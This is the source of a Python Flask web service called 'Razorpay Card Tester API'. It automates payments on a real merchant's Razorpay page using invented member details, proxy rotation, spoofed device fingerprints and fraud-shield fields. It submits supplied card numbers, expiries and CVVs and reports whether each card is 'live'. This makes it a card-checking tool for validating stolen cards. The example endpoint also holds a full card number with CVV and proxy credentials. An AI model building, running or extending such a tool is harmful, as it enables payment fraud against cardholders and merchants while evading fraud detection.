# app.py - Enhanced redirect extraction for JavaScript redirects
from flask import Flask, request, jsonify
import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
from urllib.parse import quote, urlparse, parse_qs, unquote
import os

urllib3.disable_warnings()

app = Flask(__name__)

# ========== CONFIGURATION ==========
URL = "https://pages.razorpay.com/iicdelhi"
AMO = 10000  # ₹100.00 in paise

# ========== HELPER FUNCTIONS ==========
def generate_membership_id():
    return f"MEM{random.randint(10000, 99999)}"

def generate_member_name():
    first_names = ["Raj", "Priya", "Amit", "Sneha", "Vikram", "Ananya", "Arjun", "Kavya", "Rohan", "Ishita"]
    last_names = ["Sharma", "Verma", "Patel", "Kumar", "Singh", "Reddy", "Joshi", "Gupta", "Malhotra", "Mehta"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com", "icloud.com"]
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{username}@{random.choice(domains)}"

def generate_phone():
    return f"+91{random.randint(7000000000, 9999999999)}"

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def extract_all_redirects(html_content):
    """Extract ALL possible redirect URLs from HTML"""
    redirects = []
    
    # Pattern 1: window.location.href
    patterns = [
        r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
        r'window\.location\.replace\s*\(["\']([^"\']+)["\']\)',
        r'window\.location\.assign\s*\(["\']([^"\']+)["\']\)',
        r'location\.href\s*=\s*["\']([^"\']+)["\']',
        r'document\.location\s*=\s*["\']([^"\']+)["\']',
        r'top\.location\s*=\s*["\']([^"\']+)["\']',
        r'parent\.location\s*=\s*["\']([^"\']+)["\']',
        r'self\.location\s*=\s*["\']([^"\']+)["\']',
        r'window\.location\.pathname\s*=\s*["\']([^"\']+)["\']',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            if match.startswith('http') or match.startswith('/'):
                redirects.append(match)
    
    # Pattern 2: Meta refresh
    meta_matches = re.findall(r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\'][^"\']*url=([^"\']+)["\']', html_content, re.IGNORECASE)
    redirects.extend(meta_matches)
    
    # Pattern 3: Form action
    form_matches = re.findall(r'<form[^>]+action=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
    redirects.extend(form_matches)
    
    # Pattern 4: Iframe src
    iframe_matches = re.findall(r'<iframe[^>]+src=["\']([^"\']+)["\']', html_content, re.IGNORECASE)
    redirects.extend(iframe_matches)
    
    # Pattern 5: JavaScript variables
    var_patterns = [
        r'var\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
        r'var\s+redirectURL\s*=\s*["\']([^"\']+)["\']',
        r'var\s+url\s*=\s*["\']([^"\']+)["\']',
        r'var\s+redirect_uri\s*=\s*["\']([^"\']+)["\']',
        r'let\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
        r'const\s+redirectUrl\s*=\s*["\']([^"\']+)["\']',
        r'redirect_url\s*[:=]\s*["\']([^"\']+)["\']',
        r'redirect_uri\s*[:=]\s*["\']([^"\']+)["\']',
    ]
    
    for pattern in var_patterns:
        matches = re.findall(pattern, html_content, re.IGNORECASE)
        for match in matches:
            if match.startswith('http') or match.startswith('/'):
                redirects.append(match)
    
    # Pattern 6: Any URL with payment/3ds/auth in it
    url_pattern = re.compile(r'https?://[^\s"\'<>(){}[\]]+')
    urls = url_pattern.findall(html_content)
    
    for url in urls:
        # Skip Razorpay/CDN/Google/Fonts
        if any(skip in url.lower() for skip in ['razorpay', 'cdn', 'google', 'font', 'gstatic', 'cloudflare', 'pages.razorpay']):
            continue
        # Look for payment/3ds/auth related URLs
        if any(key in url.lower() for key in ['3ds', 'acs', 'auth', 'payment', 'bank', 'secure', 'verify', 'otp']):
            redirects.append(url)
    
    # Pattern 7: Look for redirect in JSON-like data
    json_redirect = re.search(r'"redirect_url"\s*:\s*"([^"]+)"', html_content, re.IGNORECASE)
    if json_redirect:
        redirects.append(json_redirect.group(1))
    
    # Clean up and deduplicate
    clean_redirects = []
    for r in redirects:
        # Decode HTML entities
        r = r.replace('&amp;', '&').replace('&#39;', "'").replace('&quot;', '"')
        # Make sure it's a full URL
        if r.startswith('/'):
            r = 'https://api.razorpay.com' + r
        if r.startswith('http') and r not in clean_redirects:
            clean_redirects.append(r)
    
    return clean_redirects

def parse_proxy(proxy_string):
    if not proxy_string:
        return None
    parts = proxy_string.split(':')
    if len(parts) == 4:
        return {"http": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}", 
                "https": f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"}
    elif len(parts) == 2:
        return {"http": f"http://{parts[0]}:{parts[1]}", 
                "https": f"http://{parts[0]}:{parts[1]}"}
    return None

def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
    result = {
        "status": "error",
        "message": "Unknown error",
        "raw_json": None,
        "card": f"{cc[:6]}******{cc[-4:]}",
        "redirect_url": None,
        "all_redirects": []
    }
    
    try:
        MEMBERSHIP_ID = generate_membership_id()
        MEMBER_NAME = generate_member_name()
        EMAIL = generate_email()
        PHONE = generate_phone()
        
        brand = get_card_brand(cc)
        year_full = int("20" + yy)
        
        session = requests.Session()
        session.verify = False
        if proxy_string:
            proxy_dict = parse_proxy(proxy_string)
            if proxy_dict:
                session.proxies = proxy_dict
        
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        rzp_device_id = f"1.{h}.{ts}.{rnd}"
        BASE62 = string.ascii_letters + string.digits
        rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'
        BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
        BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
        
        # STEP 1: Get payment page and extract keys
        resp_init = session.get(URL, timeout=30)
        json_text = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
        if not json_text:
            result["message"] = "Failed to extract page data"
            return result
        
        init_data = json.loads(json_text.group(1))
        kyid = init_data["key_id"]
        plink = init_data["payment_link"]["id"]
        ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
        keyless_header = init_data.get("keyless_header")
        keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
        
        # STEP 2: Create order
        headers_order = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': 'https://pages.razorpay.com',
            'Referer': 'https://pages.razorpay.com/',
            'User-Agent': ua,
        }
        
        json_order = {
            'line_items': [{'payment_page_item_id': ppid, 'amount': AMO}],
            'notes': {
                'membership_id': MEMBERSHIP_ID,
                'member_name': MEMBER_NAME,
                'email': EMAIL,
                'contact_number': PHONE,
            },
        }
        
        resp_order = session.post(
            f"https://api.razorpay.com/v1/payment_pages/{plink}/order", 
            headers=headers_order, 
            json=json_order, 
            timeout=30
        )
        
        if resp_order.status_code != 200:
            result["message"] = f"Order creation failed: {resp_order.status_code}"
            result["raw_json"] = {"order_error": resp_order.text}
            return result
            
        order_data = json.loads(resp_order.text)
        order_id = order_data["order"]["id"]
        checkout_id = order_id.split("_")[1]
        
        # STEP 3: Get session token
        params_public = {
            'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
            'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
            'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
        }
        resp_public = session.get(
            'https://api.razorpay.com/v1/checkout/public', 
            params=params_public, 
            headers={'User-Agent': ua}, 
            timeout=30
        )
        
        sessid = find_between(resp_public.text, 'window.session_token="', '";')
        if not sessid:
            m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
            if m: 
                sessid = m.group(1)
        
        if not sessid:
            result["message"] = "Failed to get session token"
            return result
        
        # STEP 4: Checkout order state
        headers_co = {
            'Accept': '*/*', 
            'Content-type': 'application/x-www-form-urlencoded',
            'Origin': 'https://api.razorpay.com',
            'Referer': resp_public.url,
            'User-Agent': ua, 
            'x-session-token': sessid,
        }
        params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
        data_co = {
            'notes[email]': EMAIL, 
            'notes[phone]': PHONE[3:], 
            'payment_link_id': plink,
            'key_id': kyid, 
            'contact': PHONE, 
            'email': EMAIL, 
            'currency': 'INR',
            '_[integration]': 'payment_pages', 
            '_[device.id]': rzp_device_id,
            '_[library]': 'checkoutjs', 
            '_[library_src]': 'no-src', 
            '_[current_script_src]': 'no-src',
            '_[platform]': 'browser', 
            '_[env]': '', 
            '_[is_magic_script]': 'false', 
            '_[os]': 'windows',
            '_[shield][fhash]': h, 
            '_[shield][tz]': '0', 
            '_[device_id]': rzp_device_id,
            '_[build]': BUILD, 
            '_[shield][os]': 'windows', 
            '_[shield][platform]': 'browser',
            '_[shield][browser]': 'chrome', 
            '_[request_index]': '0', 
            'amount': AMO,
            'order_id': order_id, 
            'method': 'card', 
            'checkout_id': checkout_id,
        }
        session.post(
            'https://api.razorpay.com/v1/standard_checkout/checkout/order', 
            params=params_co, 
            headers=headers_co, 
            data=data_co, 
            timeout=30
        )
        
        # STEP 5: Cross border flows - capture the currency_request_id
        headers_cb = {
            "Accept": "*/*", 
            "Content-type": "application/json", 
            "User-Agent": ua, 
            "x-session-token": sessid, 
            "Origin": "https://api.razorpay.com",
            "Referer": resp_public.url,
        }
        payload_cb = {
            "identifiers": {
                "merchant": {"country": "IN"}, 
                "card": {"country": "US", "dcc_blacklist": False, "network": brand}, 
                "method": "card", 
                "payment_currency": "INR"
            },
            "forex_charges": {"amount": AMO, "currency": "INR", "filters": {"method": "card"}}
        }
        resp_cb = session.post(
            f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", 
            headers=headers_cb, 
            json=payload_cb, 
            timeout=30
        )
        
        # Extract currency_request_id
        currency_request_id = None
        try:
            cb_data = resp_cb.json()
            currency_request_id = (
                cb_data.get('currency_request_id') or 
                cb_data.get('data', {}).get('currency_request_id') or
                cb_data.get('id') or
                cb_data.get('request_id')
            )
        except:
            pass
        
        # STEP 6: Create payment
        headers_create = {
            'Accept': '*/*', 
            'Content-type': 'application/x-www-form-urlencoded', 
            'Origin': 'https://api.razorpay.com',
            'Referer': resp_public.url,
            'User-Agent': ua, 
            'x-session-token': sessid,
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
        }
        params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
        token_create = base64.b64encode(
            json.dumps([{"name": "sardine", "metadata": {"session_id": checkout_id}}], 
            separators=(',', ':')).encode()
        ).decode()
        
        data_create = {
            "user_risk_providers_token": token_create, 
            'notes[comment]': '', 
            'notes[email]': EMAIL,
            'notes[phone]': PHONE[3:], 
            'notes[name]': MEMBER_NAME,
            'payment_link_id': plink, 
            'key_id': kyid,
            'contact': PHONE, 
            'email': EMAIL, 
            'currency': 'INR',
            '_[integration]': 'payment_pages',
            '_[checkout_id]': checkout_id, 
            '_[device.id]': rzp_device_id, 
            '_[env]': '', 
            '_[library]': 'checkoutjs',
            '_[library_src]': 'no-src', 
            '_[current_script_src]': 'no-src', 
            '_[is_magic_script]': 'false',
            '_[platform]': 'browser', 
            '_[referer]': URL, 
            '_[shield][fhash]': h, 
            '_[shield][tz]': '-330',
            '_[device_id]': rzp_device_id, 
            '_[build]': BUILD, 
            '_[shield][os]': 'windows',
            '_[shield][platform]': 'browser', 
            '_[shield][browser]': 'chrome', 
            '_[request_index]': '1',
            'amount': AMO,
            'order_id': order_id, 
            'method': 'card', 
            'card[number]': cc,
            'card[cvv]': cvv, 
            'card[name]': MEMBER_NAME,
            'card[expiry_month]': mm, 
            'card[expiry_year]': year_full,
            'save': '0',
        }
        
        if currency_request_id:
            data_create['currency_request_id'] = currency_request_id
            data_create['dcc_currency'] = 'INR'
        
        resp_create = session.post(
            'https://api.razorpay.com/v1/standard_checkout/payments/create/checkout',
            params=params_create, 
            headers=headers_create, 
            data=data_create, 
            allow_redirects=False,
            timeout=30
        )
        
        # STEP 7: Parse response - ENHANCED for redirects
        result["raw_json"] = {}
        
        # Check if it's HTML
        if 'text/html' in resp_create.headers.get('Content-Type', ''):
            # First, check if there's an error in the HTML
            error_match = re.search(r'var data = ({.*?});', resp_create.text, re.DOTALL)
            if error_match:
                try:
                    error_data = json.loads(error_match.group(1))
                    if error_data.get('error'):
                        result["status"] = "declined"
                        result["message"] = f"Payment declined: {error_data['error'].get('description', 'Unknown error')}"
                        result["raw_json"] = error_data
                        # Still try to extract redirects even if there's an error
                        all_redirects = extract_all_redirects(resp_create.text)
                        if all_redirects:
                            result["all_redirects"] = all_redirects
                            result["redirect_url"] = all_redirects[0]
                        return result
                except:
                    pass
            
            # Extract ALL redirects from HTML
            all_redirects = extract_all_redirects(resp_create.text)
            
            if all_redirects:
                result["status"] = "3ds_required"
                result["message"] = "3DS authentication required - card is live"
                result["redirect_url"] = all_redirects[0]
                result["all_redirects"] = all_redirects
                result["raw_json"] = {
                    "redirect": True, 
                    "message": "3DS OTP required",
                    "redirect_url": all_redirects[0],
                    "all_redirects": all_redirects
                }
                return result
            
            # If no redirects found but it's HTML, treat as unknown
            result["status"] = "unknown"
            result["message"] = "HTML response received but no redirect found"
            result["raw_json"] = {"html_preview": resp_create.text[:500]}
            return result
        
        # Check if it's JSON
        try:
            pay_json = json.loads(resp_create.text)
            result["raw_json"] = pay_json
            
            payment_id = pay_json.get("payment_id") or pay_json.get("id")
            status = pay_json.get("status", "unknown")
            error_desc = pay_json.get("error_description", "")
            error_code = pay_json.get("error_code", "")
            
            if payment_id and status in ["authorized", "captured", "success"]:
                result["status"] = "success"
                result["message"] = "Payment successful"
                result["raw_json"]["payment_id"] = payment_id
                return result
            
            if error_desc or error_code:
                result["status"] = "declined"
                result["message"] = f"Payment declined: {error_desc if error_desc else error_code}"
                if pay_json.get("metadata", {}).get("order_id"):
                    result["raw_json"]["metadata"] = pay_json.get("metadata")
                return result
            
            if pay_json.get("redirect") is True or pay_json.get("type") == "redirect":
                result["status"] = "3ds_required"
                result["message"] = "3DS authentication required"
                if pay_json.get("request", {}).get("url"):
                    result["redirect_url"] = pay_json["request"]["url"]
                    result["raw_json"]["redirect_url"] = pay_json["request"]["url"]
                elif pay_json.get("url"):
                    result["redirect_url"] = pay_json["url"]
                    result["raw_json"]["redirect_url"] = pay_json["url"]
                return result
            
            result["status"] = "unknown"
            result["message"] = "Unknown response from gateway"
            
        except json.JSONDecodeError:
            result["status"] = "unknown"
            result["message"] = "Non-JSON response received"
            result["raw_json"] = {"raw_response": resp_create.text[:500]}
            
            # Try to extract redirects from raw text anyway
            all_redirects = extract_all_redirects(resp_create.text)
            if all_redirects:
                result["redirect_url"] = all_redirects[0]
                result["all_redirects"] = all_redirects
        
        return result
        
    except Exception as e:
        result["status"] = "error"
        result["message"] = f"Exception: {str(e)}"
        result["raw_json"] = {"error": str(e)}
        return result

# ========== FLASK API ENDPOINTS ==========
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "service": "Razorpay Card Tester API",
        "version": "1.6",
        "endpoints": {
            "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
        },
        "example": "/test?cc=4342562526966146|08|2029|292&site=https://razorpay.me/@tpstech&proxy=jp-tok.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2",
        "status": "operational"
    })

@app.route('/test', methods=['GET'])
def test_endpoint():
    cc_param = request.args.get('cc')
    site_param = request.args.get('site')
    proxy_param = request.args.get('proxy')
    
    if not cc_param:
        return jsonify({
            "status": "error",
            "message": "Missing cc parameter. Format: cc=xxxx|mm|yy|cvv",
            "example": "cc=4342562526966146|08|2029|292"
        }), 400
    
    try:
        parts = cc_param.split('|')
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Invalid cc format. Use: xxxx|mm|yy|cvv"
            }), 400
        
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()[-2:]
        cvv = parts[3].strip()
        
        if not cc.isdigit() or len(cc) < 12:
            return jsonify({"status": "error", "message": "Invalid card number"}), 400
        if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
            return jsonify({"status": "error", "message": "Invalid month"}), 400
        if not yy.isdigit() or len(yy) != 2:
            return jsonify({"status": "error", "message": "Invalid year (use 2 digits)"}), 400
        if not cvv.isdigit() or len(cvv) < 3:
            return jsonify({"status": "error", "message": "Invalid CVV"}), 400
            
    except Exception as e:
        return jsonify({"status": "error", "message": f"Failed to parse card: {str(e)}"}), 400
    
    print(f"📥 Request received:")
    print(f"   Card: {cc[:6]}******{cc[-4:]}")
    print(f"   Site: {site_param}")
    print(f"   Proxy: {proxy_param[:30] if proxy_param else 'None'}...")
    
    result = test_card_on_razorpay(cc, mm, yy, cvv, proxy_param)
    
    if site_param:
        result["site"] = site_param
        if result.get("raw_json") and isinstance(result["raw_json"], dict):
            result["raw_json"]["site"] = site_param
    
    return jsonify(result)

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": time.time()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
